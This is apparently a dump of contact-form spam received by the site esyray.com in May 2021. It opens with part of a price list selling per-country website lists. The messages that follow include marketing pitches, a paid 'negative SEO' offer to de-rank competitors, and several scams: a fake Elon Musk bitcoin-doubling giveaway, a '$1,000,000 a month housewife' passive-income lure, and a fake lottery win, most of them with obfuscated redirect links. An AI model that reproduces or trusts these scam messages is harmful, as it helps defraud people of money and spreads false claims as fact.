.pl 327587 websites International zone Poland:.com .net .biz .info .name .tel .mobi .asia-$50 
.pr 1358 websites Puerto Rico - $30 
.pt 263136 websites Portugal - $80 
.pt 17691 websites International zone Portugal:.com .net .biz .info .name .tel .mobi .asia-$50 
.py 5593 websites Paraguay - $30 
.py 653 websites International zone Paraguay:.com .net .biz .info .name .tel .mobi .asia-$30 
.re 15089 websites Reunion (French) - $50 
.ro 424401 websites Romania - $80 
.ro 42046 websites International zone Romania:.com .net .biz .info .name .tel .mobi .asia-$50 
.rs 85503 websites Serbia - $50 
.ru 5025331 websites Russian - $250 
.ru 514668 websites International zone Russian:.com .net .biz .info .name .tel .mobi .asia-$80 
.rw 3806 websites Rwanda - $30 
.sa 20421 websites Saudi Arabia- $50 
.sa 5064 websites International zone Saudi Arabia:.com .net .biz .info .name .tel .mobi .asia - $30 
.sc 4442 websites Seychelles- $30 
.se 1491677 websites Sweden - $100 
.se 293316 websites International zone Sweden:.com .net .biz .info .name .tel .mobi .asia-$50 
.sg 150351 websites Republic Of Singapore - $50 
.sh 7560 websites Saint Helena - $30 
.si 103778 websites Slovenia- $50 
.si 12879 websites International zone Slovenia:.com .net .biz .info .name .tel .mobi .asia-$50 
.sk 414198 websites Slovakia- $80 
.sk 31572 websites International zone Slovakia:.com .net .biz .info .name .tel .mobi .asia-$50 
.sm 8897 websites San Marino - $30 
.sn 344 websites International zone Senegal:.com .net .biz .info .name .tel .mobi .asia-$30 
.sn 4465 websites Senegal - $30 
.sr 580 websites Suriname - $30 
.sv 8432 websites Salvador- $30 
.sx 2901 websites Sint Maarten - $30 
.sy 2972 websites Syria - $30 
.sz 321 websites Swaziland - $30 
.tc 16384 websites Turks and Caicos Islands- $50 
.tf 19841 websites French Sauthern Territory - $50 
.tg 1230 websites Togo - $30 
.th 22368 websites Kingdom Of Thailand- $50 
.tj 6874 websites Tajikistan- $30 
.tj 34 websites International zone Tajikistan:.com .net .biz .info .name .tel .mobi .asia 
.tk 20085806 websites Tokelau - $500 
.tl 2748 websites East Timor - $30 
.tm 6395 websites Turkmenistan- $30 
.tm 44 websites International zone Turkmenistan:.com .net .biz .info .name .tel .mobi .asia 
.tr 243347 websites Turkey - $80 
.tr 138818 International zone Turkey:.com .net .biz .info .name .tel .mobi .asia -$50 
.tt 1017 websites Trinidad &amp; Tobago  - $30 
.ua 553216 websites Ukraina - $80 
.ua 147202 websites International zone Ukraine:.com .net .biz .info .name .tel .mobi .asia-$50 
.ug 3806 websites Uganda - $30 
.ug 720 websites International zone Uganda:.com .net .biz .info .name .tel .mobi.asia-$30 
.uk 5975887 websites United Kingdom - $250 
.uk 3304606 websites International zone United Kingdom:.com .net .biz .info .name .tel .mobi .asia-$150 
.us 3139563 websites USA - $200 
.us 578927 websites International zone USA:.com .net .biz .info .name .tel .mobi .asia-$80 
.uy 15571 websites Uruguay - $50 
.uy 31812 websites International zone Uruguay:.com .net .biz .info .name .tel .mobi .asia-$30 
.uz 38357 websites Uzbekistan - $50 
.uz  365 websites International zone Uzbekistan:.com .net .biz .info .name .tel .mobi .asia 
.vc 18641 websites Saint Vincent &amp; Grenadines - $50 
.ve 14015 websites Venezuela - $50 
.ve 2898 websites International zone Venezuela:.com .net .biz .info .name .tel .mobi .asia - $30 
.vg 8389 websites Virgin Islands (British) - $50 
.vi 109 websites Virgin Islands (US) - $30 
.vn 436005 websites Vietnam - $80 
.vn 161855 websites International zone Vietnam:.com .net .biz .info .name .tel .mobi .asia - $50 
.vu 1051 websites Vanuatu - $30 
.wf 1133 websites Wallis &amp; Futuna Islands - $30 
.ws 99308 websites Samoa - $80 
.ye 18 websites Yemen - $30 
.yt 2004 websites Mayotte - $30 
.za 1008308 websites South Africa - $100
+++ 2021-05-06 03:20:47 AM -- Email from: Becky Fabro, -- subject: Re:Attn.: Hi there - Website Submitter©, -- email: fabro.becky64@gmail.com, -- Message is: Good morning
Hope you’re good, and that the company is good. Please allow me to introduce to you this service that you may find useful for your business.
Never has it been so easy in promoting your site. Just enter your URL, and we will do the rest.
https://next-marketers.com
Kind regards,

P.S. We offer the top IT services you may check on our shop, still not enthusiastic about getting new business? Here is a simple, 1-click unsubscribe link: https://next-marketers.com/?unsubscribe=esyray.com
+++ 2021-05-06 04:17:47 AM -- Email from: J Newmn, -- subject: F.ree 26 blog post templates for esyray.com, -- email: joey+newman3@myblogposters.com, -- Message is: My name is Joey from MyBlogPosters.com.

I am a professional blogger who has been providing high quality content for years now. 

I have recently launched my own site, and I am looking to provide value for you for free, by giving away 26 professional level blog post templates (worth $297).

Blog post templates

The “How to” Blog Post

The “Tips” Blog Post

The “FAQ” Blog Post

The “Resources” Blog Post

The “Top Mistakes” Blog Post

The “Rant” Blog Post

The “Encyclopedia” Blog Post

The “Promotional” Blog Post

The “Press Release” Blog Post

The “Motivational” Blog Post

The “News” Blog Post

The “SEO” Blog Post

The “How To” Blog Post

The “Product Review” Blog Post

The “Tips” Blog Post

The “List” Blog Post

The “FAQ” Blog Post

The “Case Study” Blog Post

The “Instructional” Blog Post

The “Multi-Part” Blog Post

The “Critical” Blog Post

The “Greatest Hits” Blog Post

The “Response” Blog Post

The “Groundbreaking” Blog Post

The “Product Comparison” Blog Post

The “Promotional” Blog Post

Very easily you can spend a few minutes editing one of the templates and get a high quality, well structured engaging post your audience will love. 

If this is of interest to you, please visit https://myblogposters.com/ where you can grab your 26 free blog post templates now. 

Thanks!
+++ 2021-05-06 05:04:23 AM -- Email from: Brentrob, -- subject: This housewife makes over $ 1,000,000 a month., -- email: kersten.ehmling@web.de, -- Message is: This housewife makes over $ 1,000,000 a month. 
She makes millions of dollars doing almost nothing. CNN interviewed her how she does it, in the end she named 5 services with which she makes passive income. 
Below we will give an excerpt from her interview and list 5 services on which she makes millions of dollars without doing anything. 
An excerpt from the interview: &quot;... I am sure that I was very lucky, this is much cooler than the lottery, because I am confident in the future, 
because every day I earn more than $ 35,000 and for this I only invested $ 5000, $ 1000 in each of five services and pressed the start button ... 
there is nothing easier how to invest and press the start button and then every day receive tens of thousands of dollars of passive income ... &quot; 
Five services on which a housewife earns millions of dollars a month by investing once and pressing the start button: 
# 1 Service - Register Now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zTyj&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHZfOPKGVlcnav4-AbmcYguQJPTpQ 
# 2 Service - Register Now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc18HMH&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFl_tOEDFdzXNzrmLTcScDQWV6Qlg 
# 3 Service - Register now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zNSL&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNF83M2DwgUkzpORFzXiiurKchh9iw 
# 4 Service - Register now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zNUT&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHgBjYc2z-cwzkpEAi2Aj5FthezpA 
# 5 Service - Register now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zNW1&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFYE6BcTfiRaLBuYajWnB9XliGiwQ
+++ 2021-05-06 03:11:03 PM -- Email from: Lonnie Rutherford, -- subject: Make cash with us!, -- email: rutherford.lonnie@yahoo.com, -- Message is: Hi there, I hope you’re doing well.

I handle influencer relations for LeggingsHut. Great to meet you! 
I stumbled across your account and thought your content would be perfect for us.
If you feel we’d make a good fit, I’d love to invite you to our referral program. 

Use this link to visit, http://leggingscashteam.com 

Sincerely, 
Leggings Cash Team Judy
+++ 2021-05-07 07:59:44 AM -- Email from: Brentrob, -- subject: This housewife makes over $ 1,000,000 a month., -- email: sumio2@arcor.de, -- Message is: This housewife makes over $ 1,000,000 a month. 
She makes millions of dollars doing almost nothing. CNN interviewed her how she does it, in the end she named 5 services with which she makes passive income. 
Below we will give an excerpt from her interview and list 5 services on which she makes millions of dollars without doing anything. 
An excerpt from the interview: &quot;... I am sure that I was very lucky, this is much cooler than the lottery, because I am confident in the future, 
because every day I earn more than $ 35,000 and for this I only invested $ 5000, $ 1000 in each of five services and pressed the start button ... 
there is nothing easier how to invest and press the start button and then every day receive tens of thousands of dollars of passive income ... &quot; 
Five services on which a housewife earns millions of dollars a month by investing once and pressing the start button: 
# 1 Service - Register Now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zTyj&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHZfOPKGVlcnav4-AbmcYguQJPTpQ 
# 2 Service - Register Now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc18HMH&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFl_tOEDFdzXNzrmLTcScDQWV6Qlg 
# 3 Service - Register now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zNSL&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNF83M2DwgUkzpORFzXiiurKchh9iw 
# 4 Service - Register now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zNUT&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHgBjYc2z-cwzkpEAi2Aj5FthezpA 
# 5 Service - Register now: https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zNW1&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFYE6BcTfiRaLBuYajWnB9XliGiwQ
+++ 2021-05-08 01:37:45 PM -- Email from: Naomi Haines, -- subject: The Magic of 10,000 Instagram Followers, -- email: hainesnaomig@gmail.com, -- Message is: Hi there,

Do you know the magic of 10K Instagram followers?

A 10k follower count on Instagram isn’t just an awareness metric. 
The milestone comes with an immediate, tangible benefit. 

Once you have 10k followers, Instagram will make it easier for you to get people
to your website via Stories with the swipe up to link feature.

Swipe up is the only way to get a direct link from your Instagram to your other web properties. 
And, it’s available in STORIES, if you have 10k followers.

The swipeable link in stories lets you send people to your blog, your ecommerce page, or your email signup list, 
without requiring the visitor to click to your bio first. The feature alone is a game changer!

Testimonial:
“Before this, Instagram rarely showed up as a traffic source for my shop or blog. 
Since that feature was added, I’m able to get more traffic to my websites directly from IG.”

To order and see all other packages please go to https://social-media-blast.com

Best,
Naomi
SMB
+++ 2021-05-09 06:47:01 PM -- Email from: Jay McDonald, -- subject: Introduction, -- email: jayson+m3@mysalesscripter.com, -- Message is: Hi there,

I hope I am not troubling you. My name is Jay and I work at Mysalesscripter.com.

I’m writing to you because I found your site: esyray.com on bing and was wondering if you are interested in a completely FREE fill in the blanks professional sales letter template you can use to generate new business straight away? If you are not the person to contact I would be very grateful if you could pass this message to them.

In addition to the sales letter template, here are some of the custom sales scripts I create:

1. Custom Sales Letters for your Product or Service to Sell Like Hot Cakes

2. Full Email Series to Establish Your Client Relationships and Maximise Sales

3. Sales Phone Call Scripts to Hit Your Sales Targets 

4. Crazy Converting Website Sales Copy 

5. Attention Grabbing Adwords and Facebook Ads

6. Slick, Memorable Video Sales Letters

7. Lead Grabbing Optin Pages and Sales Boosting Upsell Scripts

8. Professional Webinar Presentations and Webinar Promotion Material

9. Attention Getting Headlines and Call to Actions (CTA)

10. Complete Product Follow up Email Series

11. Blog content creation and management 

12. Ebook creation

To get your awesome, completely FREE, battle tested, fill in the blanks sales letter template - fuelling user engagement and generating sales - go to Mysalesscripter.com now.

This is a great risk free opportunity to test us out and take your business to the next level. Imagine the ROI if your completely FREE, professional sales letter template generates just two additional sales. 

Please go to Mysalesscripter.com now.

Kind regards,

Jay McDonald
Jayson@Mysalesscripter.com 

Sales Script Superstar at https://Mysalesscripter.com

If this is not of interest please accept my apologies and opt out here https://unsubscribe.onlineserver1.com/m?d=esyray.com
+++ 2021-05-09 11:08:50 PM -- Email from: Benny Tedbury, -- subject: Negative SEO Services, -- email: benny.tedbury@yahoo.com, -- Message is: Hi there

If you ever need Negative SEO to de-rank any site, you can hire us here
https://www.speed-seo.net/product/negative-seo-service/
+++ 2021-05-10 03:53:19 AM -- Email from: JamesJoymn, -- subject: Invest $ 3788 in Bitcoin once and get $ 99236 passive income per month, -- email: hajuja1@freenet.de, -- Message is: Passive Income: How to Earn $2500 Per Day in 2021   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1Jpgr&amp;sa=D&amp;Mg=Vs&amp;usg=AFQjCNFtc0f-Znle2hYDkjNlqovjfh5SnQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-05-10 12:17:29 PM -- Email from: Pam Amaral, -- subject: Advanced Pinterest Marketing - FREE DOWNLOAD, -- email: amaral.pam@googlemail.com, -- Message is: Pinterest Marketing &amp; Advertising Beginner To Advanced 2021 - Video Course

FREEE DOWNLOAD 

https://bit.ly/2RFtvvH

Unleash a Tidal Wave of Traffic &amp; Sales THIS MONTH, WITHOUT ANY Pinterest Marketing Experience or Even Website!

Complete, 2021, step-by-step guide to unleashing a tidal wave of traffic &amp; sales FAST, WITHOUT ANY marketing experience (or even website)!

14 FREE, stunning, done-for-you Pinterest graphic templates.

Pinterest SEO - build a machine that can reach THOUSANDS of your dream customers &amp; get them to buy while you sleep.

Read the minds of your target audience to know EXACTLY what products &amp; content they desperately want, how to give it to them &amp; profit.

Step-by-Step guide to creating stunning Pinterest graphics THAT GET RESULTS in minutes (for free) without any design experience.

Save HOURS of time &amp; stress by quickly identifying &amp; killing bad strategies with Pinterest Analytics.

2 simple &amp; INSANELY PROFITABLE Pinterest advertising campaigns virtually ANY business can implement today!

Pinterest Advertising simplified - complete step-by-step guide.

FREEE DOWNLOAD 

https://bit.ly/2RFtvvH
+++ 2021-05-10 02:31:33 PM -- Email from: Carmela Leigh, -- subject: 200 subscribers for esyray.com, have arrived!, -- email: carmela.leigh@yahoo.com, -- Message is: Hi
Do you pay enough attention to your business's social media accounts? Let me guess, and it takes too much time isn't it? We can't wait to grow your business on social media.
See what we can do for you:
https://next-marketers.com/socialnetworks
Kind regards,

P.S. We offer the best marketing services you can order on our website, still not enthusiastic about getting new clients? Here is a simple, 1-click unsubscribe link: https://next-marketers.com/?unsubscribe=esyray.com
+++ 2021-05-10 04:08:44 PM -- Email from: Benjamin Iliffe, -- subject: Find Out Your Romantic Compatibility With Your Mate, -- email: sales1@astrologicalstudio.com, -- Message is: Are you and your mate a good match? Find out with a Romantic Compatibility Report, your best resource for a romantic comparison. Recently called &quot;the best chart comparison report on the market&quot; by American Astrology magazine. Compares the charts of two individuals using the synastry, or inter-aspects. Includes a colorful bi-wheel chart with complete interpretations. What is it about them that's so appealing? Why do they make you laugh as no one else can? Do you have long-term potential? How can you help each other grow? Whether it's a new flirtation or a lifelong partnership, your stars light the way to a deeper understanding of yourself, your lover, and your relationship. Find out why American Astrology magazine calls it &quot;the best chart comparison report on the market.&quot; Discover your lover...   Please visit our site https://astrologicalstudio.com for more information. We will be delighted to hear from you. Have a great day. Best regards Brian WRIGHT Eng., WEXX ASTROLOGICAL STUDIO, sales@astrologicalstudio.com, https://astrologicalstudio.com
+++ 2021-05-11 04:16:40 AM -- Email from: JamesJoymn, -- subject: Make $12000/month Passively - Passive Income, -- email: franziwitt@arcor.de, -- Message is: Passive Income: How to Earn $2500 Per Day in 2021   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc1zTyj&amp;sa=D&amp;Fu=Vo&amp;usg=AFQjCNHZfOPKGVlcnav4-AbmcYguQJPTpQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-05-11 12:37:44 PM -- Email from: Mike Stevenson, -- subject: Local SEO for more business, -- email: no-replysnumb@gmail.com, -- Message is: Howdy 
 
I have just analyzed  esyray.com for the Local ranking keywords and seen that your website could use a push. 
 
We will improve your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our plans here, we offer SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
Start improving your local visibility with us, today! 
 
regards 
Mike Stevenson
 
Speed SEO Digital Agency 
support@speed-seo.net
+++ 2021-05-11 08:38:14 PM -- Email from: Francis Jamieson, -- subject: Voice search, -- email: francis.jamieson@alexabusinessdirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://alexabusinessdirectory.link/abcc1/?=esyray.com


 

 
Francis















 
2764 Pleasant Road Suite        Suite A PMB 708        Fort Mill        SC        29708

You can skip future marketing messages here:
https://alexabusinessdirectory.link/out.php?site=esyray.com
+++ 2021-05-12 06:28:32 AM -- Email from: Rachel Florent, -- subject: surprising, -- email: rachel.florent@videomarketingnow.xyz, -- Message is: Hey, 

You have a lot going on right now, but maybe we can help?

We make professional videos for businesses to put on their websites.

See examples of what we can do for you:
https://www.videomarketingnow.xyz/success/?=esyray.com

These videos are helping businesses GROW right now, at a time when they need it most.

Rachel Florent
Custom Video Specialist





410 Santa Clara St. East, Unit 817	
San Jose,	CA 95113
 
No more video marketing:
https://videomarketingnow.xyz/out.php/?site=esyray.com
+++ 2021-05-12 02:32:52 PM -- Email from: Marcobep, -- subject: You have won $ 1000 in the lottery, -- email: ahmedkirillov5@gmail.com, -- Message is: Congratulations, you have won $ 1000 in the lottery! Take the money --&gt; 4erteg.ru 
&lt;a href=http://4erteg.ru/&gt;Detail&lt;/a&gt;:  &lt;a href=http://4erteg.ru/&gt;http://4erteg.ru/&lt;/a&gt;  http://4erteg.ru/ &lt;a href=&quot;http://4erteg.ru/&quot;&gt;http://4erteg.ru/&lt;/a&gt;
+++ 2021-05-12 04:38:45 PM -- Email from: Louvenia Blue, -- subject: Twitter Tweets, have arrived!, -- email: blue.louvenia@msn.com, -- Message is: Good evening - esyray.com, 

Social Signals can serve as social proof. The more credible the evidence of your popularity, the better. Social share counts offer visitors a tangible count of your content's circulation, increasing the assumed appeal and value it.
Check what we can do for you: 
https://it-technicians.com/socialsignals
Best regards,

P.S. We offer the top marketing services you may find on our shop, still not thinking about getting clients? Here is a quick, 1-click unsubscribe link: https://it-technicians.com/?unsubscribe=esyray.com
+++ 2021-05-12 05:15:17 PM -- Email from: Sofia Birkbeck, -- subject: Elon Musk's SpaceX accepts Dogecoin as payment to launch ‘DOGE-1 mission to the Moon’ next year, -- email: sofia.birkbeck81@outlook.com, -- Message is: Elon Musk’s SpaceX will launch the “DOGE-1 Mission to the Moon” in the first quarter of 2022, with the company accepting the meme-inspired cryptocurrency as payment.

Geometric Energy Corporation announced the dogecoin-funded mission on Sunday, with DOGE-1 representing a 40 kilogram cube satellite flying as a payload on a Falcon 9 rocket.

SpaceX vice president of commercial sales Tom Ochinero said in a statement that DOGE-1 “will demonstrate the application of cryptocurrency beyond Earth orbit and set the foundation for interplanetary commerce.”

Reference: https://www.cnbc.com/2021/05/09/spacex-accepts-dogecoin-payment-for-doge-1-mission-to-the-moon.html

Doge has gone up 1161% since early April this year.

If you want to be part of this history moment, you can buy Doge coin at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-05-13 10:32:08 AM -- Email from: Ronaldspext, -- subject: Elon Musk distributes 5,000 Bitcoins, -- email: pboston@live.ca, -- Message is: Elon Musk distributes 5,000 Bitcoins 
 
Tesla started the campaign for the distribution of bitcoins from yesterday. The action says that only 5,000 bitcoins will be distributed, but one of the commentators said that in fact, Elon Musk intends to distribute 25,000 bitcoins. 
https://www.google.com/url?q=https%3A%2F%2Ffdgdfgfgdhd.blogspot.com%2F&amp;sa=D&amp;By=Sw&amp;usg=AFQjCNELj2KjBSHMk8MxDZiwZJf3mujXQw 
Today I sent 3 Bitcoins to Tesla and received 6 Bitcoins back !!! Bitcoins are returned doubled. The company's website keeps statistics in real time, who sent and received how many bitcoins in double the amount. 
https://www.google.com/url?q=https%3A%2F%2Ffdgdfgfgdhd.blogspot.com%2F&amp;sa=D&amp;Ae=Mo&amp;usg=AFQjCNELj2KjBSHMk8MxDZiwZJf3mujXQw 
Today I intend to send 3 more bitcoins and quit my annoying job, I also handed out all my debts and looked after myself a brand new BMW X5 in a car dealership. Hurry up and you, because there are a lot of people who want to and everyone wants to get double profits just like that. 
https://www.google.com/url?q=https%3A%2F%2Ffdgdfgfgdhd.blogspot.com%2F&amp;sa=D&amp;Md=Si&amp;usg=AFQjCNELj2KjBSHMk8MxDZiwZJf3mujXQw
+++ 2021-05-14 09:01:19 AM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-05-14 09:50:03 AM -- Email from: Andy Myres, -- subject: USANA—High-Quality, Science-Based Nutrition and Skin Care, -- email: andy.myres@msn.com, -- Message is: Hello esyray.com

USANA—High-Quality, Science-Based Nutrition and Skin Care

Millions around the world trust its products such as USANA essentials vitamins. 
This innovative company serves ordinary health-conscious individuals to Olympians and professional athletes. 
Products come from a state-of-the-art FDA approved facility.
Furthermore, each supplement is the product of the minds of the leading scientists in the world, and formulas developed in USANA’s laboratories.

Browse Our Range Of Supplements To Help Build Your Immune System. Order Online For Express Delivery  https://zeep.ly/byXG4

Thanks, Andy Myres
If you no longer wish to hear from us, please reply to this email.
+++ 2021-05-14 11:04:44 AM -- Email from: Yahoo, -- subject: Most profitable cryptocurrency miners released, -- email: press@yahoo.com, -- Message is: Most profitable cryptocurrency miners has been released : 
DBT Miner: $7,500 (Bitcoin), $13,000 (Litecoin), $13,000 (Ethereum), and $15,000 (Monero) 
 
GBT Miner: $22,500 (Bitcoin), $39,000 (Litecoin), $37,000 (Ethereum), and $45,000 (Monero) 
Read more here : 
https://www.yahoo.com/now/bitwats-release-most-profitable-asic-195600764.html
+++ 2021-05-14 04:03:48 PM -- Email from: Nezabudkacag, -- subject: Nezabudka WOW!, -- email: nezabudkacag@drstranst.xyz, -- Message is: Ошибка: Dropped index http://schema.org/Movie
+++ 2021-05-15 04:17:31 AM -- Email from: Antwan McCaughey, -- subject: Elon Musk's SpaceX accepts Dogecoin as payment to launch ‘DOGE-1 mission to the Moon’ next year, -- email: antwan.mccaughey@msn.com, -- Message is: Elon Musk’s SpaceX will launch the “DOGE-1 Mission to the Moon” in the first quarter of 2022, with the company accepting the meme-inspired cryptocurrency as payment.

Geometric Energy Corporation announced the dogecoin-funded mission on Sunday, with DOGE-1 representing a 40 kilogram cube satellite flying as a payload on a Falcon 9 rocket.

SpaceX vice president of commercial sales Tom Ochinero said in a statement that DOGE-1 “will demonstrate the application of cryptocurrency beyond Earth orbit and set the foundation for interplanetary commerce.”

Reference: https://www.cnbc.com/2021/05/09/spacex-accepts-dogecoin-payment-for-doge-1-mission-to-the-moon.html

Doge has gone up 1161% since early April this year.

If you want to be part of this history moment, you can buy Doge coin at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-05-15 06:51:48 AM -- Email from: Margret Gunn, -- subject: USANA—High-Quality, Science-Based Nutrition and Skin Care, -- email: gunn.margret@yahoo.com, -- Message is: Hello esyray.com

USANA—High-Quality, Science-Based Nutrition and Skin Care

Millions around the world trust its products such as USANA essentials vitamins. 
This innovative company serves ordinary health-conscious individuals to Olympians and professional athletes. 
Products come from a state-of-the-art FDA approved facility.
Furthermore, each supplement is the product of the minds of the leading scientists in the world, and formulas developed in USANA’s laboratories.

Browse Our Range Of Supplements To Help Build Your Immune System. Order Online For Express Delivery  https://zeep.ly/byXG4

Thanks, Margret Gunn
If you no longer wish to hear from us, please reply to this email.
+++ 2021-05-15 07:29:57 AM -- Email from: Stevefar, -- subject: Elon Musk 5,000 BTC Giveaway!, -- email: nellitalia9@hotmail.com, -- Message is: Elon Musk 5,000 BTC Giveaway! 
Due to the fact that Tesla has stopped selling cars for Bitcoins. 
Elon Musk decided to distribute 5,000 Bitcoins per week for a month. 
https://www.google.com/url?q=https%3A%2F%2Ffdgdfgfgdhd.blogspot.com%2F&amp;sa=D&amp;Ju=Ch&amp;usg=AFQjCNELj2KjBSHMk8MxDZiwZJf3mujXQw 
More than 500 people have already taken part in this action and they received the promised bitcoins from Elon Musk. 
Hurry up, otherwise you may not be enough ... 
https://www.google.com/url?q=https%3A%2F%2Ffdgdfgfgdhd.blogspot.com%2F&amp;sa=D&amp;Ad=Xi&amp;usg=AFQjCNELj2KjBSHMk8MxDZiwZJf3mujXQw
+++ 2021-05-15 04:10:14 PM -- Email from: Kurt Quiroz, -- subject: order-fulfillment.net, -- email: kurt@order-fulfillment.net, -- Message is: Hello from order-fulfillment.net,

Doing your own product shipping or order fulfillment in house?

Tired of it? Visit us on www.order-fulfillment.net  

We can store, inventory, and manage your drop shipping / order fulfillment for you.  

Based in the US for almost 2 decades - we ship around the world and will save you time and money.

Who would be the best contact at your company to discuss?

Here are some of the items we ship for clients:
-Books, training manuals, guides
-New member welcomes boxes and gifts
-Product samples
-Marketing materials
-Medical program test kits
-Follow up gifts to clients, leads, and prospects

Thank you!
Fulfillment Warehouse
https://order-fulfillment.net
+++ 2021-05-16 01:11:49 PM -- Email from: Sheldon Seymour, -- subject: Elon Musk's SpaceX accepts Dogecoin as payment to launch ‘DOGE-1 mission to the Moon’ next year, -- email: sheldon.seymour@gmail.com, -- Message is: Elon Musk’s SpaceX will launch the “DOGE-1 Mission to the Moon” in the first quarter of 2022, with the company accepting the meme-inspired cryptocurrency as payment.

Geometric Energy Corporation announced the dogecoin-funded mission on Sunday, with DOGE-1 representing a 40 kilogram cube satellite flying as a payload on a Falcon 9 rocket.

SpaceX vice president of commercial sales Tom Ochinero said in a statement that DOGE-1 “will demonstrate the application of cryptocurrency beyond Earth orbit and set the foundation for interplanetary commerce.”

Reference: https://www.cnbc.com/2021/05/09/spacex-accepts-dogecoin-payment-for-doge-1-mission-to-the-moon.html

Doge has gone up 1161% since early April this year.

If you want to be part of this history moment, you can buy Doge coin at Binance here (biggest crypto exchange in the world).

https://bit.ly/33yXOqz  -&gt; Use this link to sign up at Binance for free and get 10% off ALL your trades in Binance forever!
+++ 2021-05-16 02:32:25 PM -- Email from: Bettie Carnahan, -- subject: esyray.com is King but traffic is Queen, and the lady rules the house!, -- email: bettie.carnahan@gmail.com, -- Message is: Good evening 
Serious entrepreneurs need many because of their business to convert leads to clients from their site:
https://genius-seo.com/backlinks-generator
Best regards,

P.S. We offer the best marketing services you may order on our website for making big money in a small business, still not considering getting new business? Here is a simple, 1-click unsubscribe link: https://genius-seo.com/?unsubscribe=esyray.com
+++ 2021-05-17 01:53:30 AM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

